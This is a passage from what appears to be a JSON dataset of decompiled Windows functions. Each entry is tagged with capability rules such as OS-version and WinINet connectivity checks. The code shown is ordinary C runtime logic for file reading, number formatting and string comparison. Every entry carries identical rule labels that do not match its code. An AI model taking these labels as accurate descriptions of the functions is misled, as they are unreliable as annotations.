fcn.0041da34();\n                    *puVar7 = 9;\n                    puVar7 = fcn.0041da3d();\n                    *puVar7 = 5;\n                }\n                else {\n                    if (iVar9 == 0x6d) {\n                        return 0;\n                    }\n                    fcn.0041da46(iVar9);\n                }\n                return -1;\n            }\n            if ((*(*piVar1 + 4 + iVar9) & 0x80) == 0) {\n                return var_8h + lpNumberOfBytesRead;\n            }\n            if ((lpNumberOfBytesRead == 0) || (*arg_ch != '\\n')) {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 & 0xfb;\n            }\n            else {\n                puVar2 = *piVar1 + 4 + iVar9;\n                *puVar2 = *puVar2 | 4;\n            }\n            var_8h = arg_ch + var_8h + lpNumberOfBytesRead;\n            nNumberOfBytesToRead = arg_ch;\n            pcVar8 = arg_ch;\n            if (arg_ch < var_8h) {\n                do {\n                    cVar4 = *nNumberOfBytesToRead;\n                    if (cVar4 == '\\x1a') {\n                        if ((*(*piVar1 + 4 + iVar9) & 0x40) == 0) {\n                            puVar2 = *piVar1 + 4 + iVar9;\n                            *puVar2 = *puVar2 | 2;\n                        }\n                        break;\n                    }\n                    if (cVar4 == '\\r') {\n                        if (nNumberOfBytesToRead < var_8h + -1) {\n                            if (nNumberOfBytesToRead[1] == '\\n') {\n                                pcVar5 = nNumberOfBytesToRead + 2;\n                                goto code_r0x00425a62;\n                            }\ncode_r0x00425a7c:\n                            nNumberOfBytesToRead = nNumberOfBytesToRead + 1;\n                            *pcVar8 = '\\r';\n                        }\n                        else {\n                            pcVar5 = nNumberOfBytesToRead + 1;\n                            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (*(*piVar1 + iVar9), &lpBuffer, 1, &lpNumberOfBytesRead, 0);\n                            if (((iVar6 == 0) && (iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar6 != 0)) ||\n                               (lpNumberOfBytesRead == 0)) goto code_r0x00425a7c;\n                            if ((*(*piVar1 + 4 + iVar9) & 0x48) == 0) {\n                                if ((pcVar8 == arg_ch) && (lpBuffer == '\\n')) goto code_r0x00425a62;\n                                fcn.00423ea1(arg_8h, 0xffffffff, 1);\n                                if (lpBuffer == '\\n') goto code_r0x00425a80;\n                                goto code_r0x00425a7c;\n                            }\n                            if (lpBuffer == '\\n') {\ncode_r0x00425a62:\n                                nNumberOfBytesToRead = pcVar5;\n                                *pcVar8 = '\\n';\n                            }\n                            else {\n                                *pcVar8 = '\\r';\n                                *(*piVar1 + 5 + iVar9) = lpBuffer;\n                                nNumberOfBytesToRead = pcVar5;\n                            }\n                        }\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead;\n                    }\n                    else {\n                        *pcVar8 = cVar4;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar5 = nNumberOfBytesToRead + 1;\n                    }\ncode_r0x00425a80:\n                    nNumberOfBytesToRead = pcVar5;\n                } while (nNumberOfBytesToRead < var_8h);\n            }\n            return pcVar8 - arg_ch;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1331
    },
    "00425d13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00425fe9)\n// WARNING: Removing unreachable block (ram,0x00425f63)\n// WARNING: Removing unreachable block (ram,0x004260c5)\n// WARNING: Removing unreachable block (ram,0x00425f75)\n// WARNING: Removing unreachable block (ram,0x00425f7d)\n// WARNING: Removing unreachable block (ram,0x00425f83)\n// WARNING: Removing unreachable block (ram,0x00425f86)\n// WARNING: Removing unreachable block (ram,0x00425f8d)\n// WARNING: Removing unreachable block (ram,0x00425f97)\n// WARNING: Removing unreachable block (ram,0x00426061)\n// WARNING: Removing unreachable block (ram,0x0042605b)\n// WARNING: Removing unreachable block (ram,0x00426067)\n// WARNING: Removing unreachable block (ram,0x00426084)\n// WARNING: Removing unreachable block (ram,0x00426086)\n// WARNING: Removing unreachable block (ram,0x0042608e)\n// WARNING: Removing unreachable block (ram,0x00426091)\n// WARNING: Removing unreachable block (ram,0x00426096)\n// WARNING: Removing unreachable block (ram,0x00426099)\n// WARNING: Removing unreachable block (ram,0x004260ce)\n// WARNING: Removing unreachable block (ram,0x004260a0)\n// WARNING: Removing unreachable block (ram,0x004260a7)\n// WARNING: Removing unreachable block (ram,0x004260e5)\n// WARNING: Removing unreachable block (ram,0x004260ec)\n// WARNING: Removing unreachable block (ram,0x004260f4)\n\nvoid __cdecl\nfcn.00425d13(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_19h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint var_4h;\n    \n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x00425d76. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x426117\n    (**0x426117)();\n    return;\n}\n",
        "token_count": 679
    },
    "00426147": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00426147(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint var_1ch;\n    uchar var_18h;\n    uchar var_17h;\n    uchar var_16h;\n    uchar var_15h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    ushort var_10h;\n    uint var_eh;\n    uint32_t var_ah;\n    uchar var_6h;\n    char var_5h;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    uVar3 = arg_10h & 0x7fff;\n    var_1ch._0_1_ = 0xcc;\n    var_1ch._1_1_ = 0xcc;\n    var_1ch._2_1_ = 0xcc;\n    var_1ch._3_1_ = 0xcc;\n    var_18h = 0xcc;\n    var_17h = 0xcc;\n    var_16h = 0xcc;\n    var_15h = 0xcc;\n    var_14h = 0xcc;\n    var_13h = 0xcc;\n    var_12h = 0xfb;\n    var_11h = 0x3f;\n    if ((arg_10h & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 0x2d;\n    }\n    if (((uVar3 == 0) && (arg_ch == 0)) && (arg_8h == 0)) {\ncode_r0x004262bd:\n        *(arg_1ch + 2) = 0x30;\ncode_r0x004263c0:\n        *arg_1ch = 0;\n        *(arg_1ch + 1) = 0x20;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 5) = 0;\n    }\n    else {\n        if (uVar3 == 0x7fff) {\n            *arg_1ch = 1;\n            if (((arg_ch == 0x80000000) && (arg_8h == 0)) || ((arg_ch & 0x40000000) != 0)) {\n                if (((arg_10h & 0x8000) == 0) || (arg_ch != 0xc0000000)) {\n                    if ((arg_ch != 0x80000000) || (arg_8h != 0)) goto code_r0x00426233;\n                    pcVar8 = \"1#INF\";\n                }\n                else {\n                    if (arg_8h != 0) {\ncode_r0x00426233:\n                        pcVar8 = \"1#QNAN\";\n                        goto code_r0x00426238;\n                    }\n                    pcVar8 = \"1#IND\";\n                }\n                fcn.00420ad0(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 5;\n            }\n            else {\n                pcVar8 = \"1#SNAN\";\ncode_r0x00426238:\n                fcn.00420ad0(arg_1ch + 2, pcVar8);\n                *(arg_1ch + 3) = 6;\n            }\n            goto code_r0x004263a2;\n        }\n        var_10h = 0;\n        iVar6 = ((uVar3 >> 8) + (arg_ch >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar3 * 0x4d10 >> 0x10;\n        var_6h = uVar3;\n        var_5h = uVar3 >> 8;\n        var_eh = arg_8h;\n        var_ah = arg_ch;\n        fcn.00426897(&var_10h, -iVar6, 1);\n        if (0x3ffe < CONCAT11(var_5h, var_6h)) {\n            iVar6 = iVar6 + 1;\n            fcn.00426665(&var_10h, &var_1ch);\n        }\n        *arg_1ch = iVar6;\n        if (((arg_18h & 1) != 0) && (arg_14h = arg_14h + iVar6,  arg_14h < 1)) goto code_r0x004262bd;\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar7 = CONCAT11(var_5h, var_6h) - 0x3ffe;\n        var_6h = 0;\n        var_5h = '\\0';\n        arg_10h = 8;\n        do {\n            fcn.00425bda(&var_10h);\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        if (iVar7 < 0) {\n            for (uVar3 = -iVar7 & 0xff; uVar3 != 0; uVar3 = uVar3 - 1) {\n                fcn.00425c08(&var_10h);\n            }\n        }\n        arg_10h = arg_14h + 1;\n        piVar4 = arg_1ch + 2;\n        var_30h = piVar4;\n        if (0 < arg_10h) {\n            do {\n                var_ah._2_2_ = var_ah >> 0x10;\n                var_eh._2_2_ = var_eh >> 0x10;\n                var_28h = CONCAT22(var_eh, var_10h);\n                uStack40 = CONCAT22(var_ah, var_eh._2_2_);\n                uStack36 = CONCAT13(var_5h, CONCAT12(var_6h, var_ah._2_2_));\n                fcn.00425bda(&var_10h);\n                fcn.00425bda(&var_10h);\n                fcn.00425b7c(&var_10h, &var_28h);\n                fcn.00425bda(&var_10h);\n                piVar4 = var_30h + 1;\n                arg_10h = arg_10h + -1;\n                *var_30h = var_5h + '0';\n                var_5h = '\\0';\n                var_30h = piVar4;\n            } while (arg_10h != 0);\n        }\n        piVar5 = piVar4 + -1;\n        piVar1 = arg_1ch + 2;\n        if (*(piVar4 + -1) < '5') {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '0')); piVar5 = piVar5 + -1) {\n            }\n            if (piVar5 < piVar1) {\n                *piVar1 = 0x30;\n                goto code_r0x004263c0;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar5 && (*piVar5 == '9')); piVar5 = piVar5 + -1) {\n                *piVar5 = 0x30;\n            }\n            if (piVar5 < piVar1) {\n                piVar5 = piVar5 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar5 = *piVar5 + '\\x01';\n        }\n        cVar2 = (piVar5 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar2;\n        *(cVar2 + 4 + arg_1ch) = 0;\n    }\ncode_r0x004263a2:\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 1930
    },
    "0042642e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042642e(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    \n    iVar1 = fcn.0041e005();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x44acc8) {\n        iVar1 = fcn.0041d16e();\n    }\n    if (arg_10h == 0) {\n        return 0;\n    }\n    iVar1 = fcn.00426939(*(iVar1 + 0xc), 1, arg_8h, arg_10h, arg_ch, arg_10h, *(iVar1 + 4), unaff_EBP, unaff_retaddr, \n                         arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                         in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                         in_stack_00000030, in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                         in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050);\n    if (iVar1 == 0) {\n        return 0x7fffffff;\n    }\n    return iVar1 + -2;\n}\n",
        "token_count": 513
    },
    "004265a9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004265a9(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bfc8, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x44ab84) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x44aba0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0042558c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\ncode_r0x00426629:\n                puVar3 = fcn.0041da34();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.0042554b(arg_8h_00);\n                iVar4 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar2);\n                if (iVar4 == 0) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                else {\n                    *(unaff_EBP + -0x1c) = 0;\n                }\n                if (*(unaff_EBP + -0x1c) != 0) {\n                    puVar3 = fcn.0041da3d();\n                    *puVar3 = *(unaff_EBP + -0x1c);\n                    goto code_r0x00426629;\n                }\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00426649();\n            goto code_r0x0042665f;\n        }\n    }\n    puVar3 = fcn.0041da34();\n    *puVar3 = 9;\ncode_r0x0042665f:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 587
    },
    "00426665": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426665(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    int32_t var_28h;\n    uint16_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = arg_ch;\n    var_4h = *0x444220;\n    var_1ch = 0;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0;\n    var_10h._2_2_ = 0;\n    var_ch._0_2_ = 0;\n    var_ch._2_2_ = 0;\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    var_8h._3_1_ = 0;\n    uVar6 = *(arg_ch + 10) & 0x7fff;\n    uVar4 = *(arg_8h + 10) & 0x7fff;\n    uVar8 = (*(arg_ch + 10) ^ *(arg_8h + 10)) & 0x8000;\n    uVar2 = uVar6 + uVar4;\n    if (((uVar4 < 0x7fff) && (uVar6 < 0x7fff)) && (uVar2 < 0xbffe)) {\n        if (uVar2 < 0x3fc0) {\ncode_r0x00426712:\n            arg_8h[2] = 0;\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            goto code_r0x0042688a;\n        }\n        if (uVar4 == 0) {\n            uVar2 = uVar2 + 1;\n            arg_8h._0_2_ = 0;\n            if ((((arg_8h[2] & 0x7fffffffU) != 0) || (arg_8h[1] != 0)) || (*arg_8h != 0)) goto code_r0x004266fc;\n        }\n        else {\ncode_r0x004266fc:\n            if (((uVar6 == 0) && (uVar2 = uVar2 + 1,  (arg_ch[2] & 0x7fffffffU) == 0)) &&\n               ((arg_ch[1] == 0 && (*arg_ch == 0)))) goto code_r0x00426712;\n            var_18h = 0;\n            var_14h = &var_ch;\n            arg_ch = 0x5;\n            do {\n                if (0 < arg_ch) {\n                    var_24h = var_18h * 2 + arg_8h;\n                    var_20h = piVar3 + 2;\n                    var_28h = arg_ch;\n                    do {\n                        iVar5 = fcn.00425b5b(var_14h[-1], *var_20h * *var_24h, var_14h + -1);\n                        if (iVar5 != 0) {\n                            *var_14h = *var_14h + 1;\n                        }\n                        var_24h = var_24h + 1;\n                        var_20h = var_20h + -2;\n                        var_28h = var_28h + -1;\n                    } while (var_28h != 0);\n                }\n                var_14h = var_14h + 2;\n                var_18h = var_18h + 1;\n                arg_ch = arg_ch + -1;\n            } while (0 < arg_ch);\n            arg_8h._0_2_ = uVar2 + 0xc002;\n            if (arg_8h < 1) {\ncode_r0x004267c6:\n                arg_8h._0_2_ = arg_8h - 1;\n                if (arg_8h < 0) {\n                    uVar7 = -arg_8h;\n                    arg_8h._0_2_ = 0;\n                    do {\n                        if ((var_10h & 1) != 0) {\n                            var_1ch = var_1ch + 1;\n                        }\n                        fcn.00425c08(&var_10h);\n                        uVar7 = uVar7 - 1;\n                    } while (uVar7 != 0);\n                    if (var_1ch != 0) {\n                        var_10h._0_1_ = var_10h | 1;\n                    }\n                }\n            }\n            else {\n                do {\n                    if ((var_8h._3_1_ & 0x80) != 0) break;\n                    fcn.00425bda(&var_10h);\n                    arg_8h._0_2_ = arg_8h - 1;\n                } while (0 < arg_8h);\n                if (arg_8h < 1) goto code_r0x004267c6;\n            }\n            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                    var_10h._2_2_ = 0;\n                    var_ch._0_2_ = 0;\n                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                        var_ch._2_2_ = 0;\n                        var_8h._0_2_ = 0;\n                        if (CONCAT11(var_8h._3_1_, var_8h._2_1_) == -1) {\n                            arg_8h._0_2_ = arg_8h + 1;\n                            var_8h._2_1_ = 0;\n                            var_8h._3_1_ = 0x80;\n                        }\n                        else {\n                            iVar1 = CONCAT11(var_8h._3_1_, var_8h._2_1_) + 1;\n                            var_8h._2_1_ = iVar1;\n                            var_8h._3_1_ = iVar1 >> 8;\n                        }\n                    }\n                    else {\n                        iVar5 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                        var_ch._2_2_ = iVar5;\n                        var_8h._0_2_ = iVar5 >> 0x10;\n                    }\n                }\n                else {\n                    iVar5 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                    var_10h._2_2_ = iVar5;\n                    var_ch._0_2_ = iVar5 >> 0x10;\n                }\n            }\n            if (0x7ffe < arg_8h) goto code_r0x0042686f;\n            *arg_8h = var_10h._2_2_;\n            *(arg_8h + 2) = CONCAT22(var_ch._2_2_, var_ch);\n            *(arg_8h + 6) = CONCAT13(var_8h._3_1_, CONCAT12(var_8h._2_1_, var_8h));\n            arg_8h._0_2_ = arg_8h | uVar8;\n        }\n        *(arg_8h + 10) = arg_8h;\n    }\n    else {\ncode_r0x0042686f:\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        arg_8h[2] = (-(uVar8 != 0) & 0x80000000) + 0x7fff8000;\n    }\ncode_r0x0042688a:\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 1907
    },
    "0042691d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0042691d(int32_t param_1)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = param_1;\n    if (param_1 != 0) {\n        do {\n            iVar1 = iVar1 + -1;\n            if (*in_EAX == '\\0') goto code_r0x00426931;\n            in_EAX = in_EAX + 1;\n        } while (iVar1 != 0);\n    }\n    iVar1 = iVar1 + -1;\ncode_r0x00426931:\n    return (param_1 - iVar1) + -1;\n}\n",
        "token_count": 142
    },
    "00426939": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_44h_2\n// WARNING: Variable defined which should be unmapped: var_40h_3\n// WARNING: Variable defined which should be unmapped: var_3ch_3\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __cdecl\nfcn.00426939(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint arg_8h, uint arg_ch, uint lpMultiByteStr, uint cbMultiByte, \n            uint lpString2, uint cchCount2, uint CodePage)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    uint Locale;\n    uint dwCmpFlags;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint lpCPInfo;\n    uint var_4h_2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_4h;\n    uint var_50h;\n    uint var_44h_2;\n    uint var_40h_3;\n    uint var_3ch_3;\n    uint lpString1;\n    uint var_30h_2;\n    uchar auStack48 [2];\n    uint var_2ah;\n    int32_t var_4ch;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_5ch;\n    uint uVar7;\n    \n    uVar7 = 0x40;\n    fcn.0041cd84();\n    *(unaff_EBP + -0x1c) = *0x444220;\n    iVar6 = 0;\n    if (*0x449b04 == 0) {\n        var_4ch = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CompareStringW)();\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x78) {\n                *0x449b04 = 2;\n            }\n        }\n        else {\n            *0x449b04 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        uVar3 = fcn.0042691d();\n        *(unaff_EBP + 0x14) = uVar3;\n    }\n    iVar2 = *(unaff_EBP + 0x1c);\n    if (0 < iVar2) {\n        iVar2 = fcn.0042691d();\n        *(unaff_EBP + 0x1c) = iVar2;\n    }\n    if ((*0x449b04 == 2) || (*0x449b04 == 0)) {\n        *(unaff_EBP + -0x38) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            *(unaff_EBP + 8) = *0x449968;\n        }\n        iVar2 = *(unaff_EBP + 0x20);\n        if (*(unaff_EBP + 0x20) == 0) {\n            iVar2 = *0x449978;\n        }\n        iVar5 = fcn.00423a40(*(unaff_EBP + 8));\n        if (iVar5 == -1) goto code_r0x00426cac;\n        if (iVar5 != iVar2) {\n            var_4ch = iVar2;\n            iVar6 = fcn.00423a83(iVar2, iVar5, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x43bfd8, uVar7);\n            if (iVar6 == 0) goto code_r0x00426cac;\n            var_4ch = iVar2;\n            iVar2 = fcn.00423a83(iVar2, iVar5, *(unaff_EBP + 0x18), unaff_EBP + 0x1c, 0, 0, 0x43bfd8, uVar7);\n            *(unaff_EBP + -0x38) = iVar2;\n            if (iVar2 == 0) {\n                fcn.0041ba6d(iVar6);\n                goto code_r0x00426cac;\n            }\n            *(unaff_EBP + 0x10) = iVar6;\n            *(unaff_EBP + 0x18) = *(unaff_EBP + -0x38);\n        }\n        var_4ch = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_CompareStringA)();\n        if (iVar6 != 0) {\n            fcn.0041ba6d(iVar6);\n            stack0xffffffd4 = 0x426ca8;\n            fcn.0041ba6d(*(unaff_EBP + -0x38));\n        }\n        goto code_r0x00426cac;\n    }\n    if (*0x449b04 != 1) goto code_r0x00426cac;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x449978;\n    }\n    if ((*(unaff_EBP + 0x14) == 0) || (iVar2 == 0)) {\n        if ((*(unaff_EBP + 0x14) == iVar2) ||\n           (((1 < iVar2 || (1 < *(unaff_EBP + 0x14))) || (iVar6 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(),  iVar6 == 0))))\n        goto code_r0x00426cac;\n        if (0 < *(unaff_EBP + 0x14)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x10) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x10)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x00426cac;\n        }\n        if (0 < *(unaff_EBP + 0x1c)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x18) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x18)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x00426cac;\n        }\n    }\n    var_4ch = *(unaff_EBP + 0x20);\n    iVar6 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    *(unaff_EBP + -0x48) = iVar6;\n    if (iVar6 == 0) goto code_r0x00426cac;\n    *(unaff_EBP + -4) = 0;\n    fcn.0041bcd0();\n    *(unaff_EBP + -0x18) = &fcn.00426939::var_4ch;\n    *(unaff_EBP + -0x34) = &fcn.00426939::var_4ch;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x34) == 0) {\n        iVar2 = fcn.0041ba5b();\n        *(unaff_EBP + -0x34) = iVar2;\n        if (iVar2 == 0) goto code_r0x00426cac;\n        *(unaff_EBP + -0x3c) = 1;\n    }\n    unique0x00007a00 = *(unaff_EBP + 0x14);\n    _auStack48 = *(unaff_EBP + 0x10);\n    var_30h_2 = 1;\n    lpString1 = *(unaff_EBP + 0x20);\n    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar2 != 0) {\n        arg_8h_00 = &fcn.00426939::lpString1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 0x20), 9, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), 0, 0);\n        *(unaff_EBP + -0x4c) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -4) = 1;\n            fcn.0041bcd0();\n            *(unaff_EBP + -0x18) = &fcn.00426939::lpString1;\n            *(unaff_EBP + -0x50) = &fcn.00426939::lpString1;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x38) {\n                arg_8h_00 = fcn.0041ba5b(iVar2 * 2);\n                if (arg_8h_00 == NULL) goto code_r0x00426be7;\n                *(unaff_EBP + -0x44) = 1;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 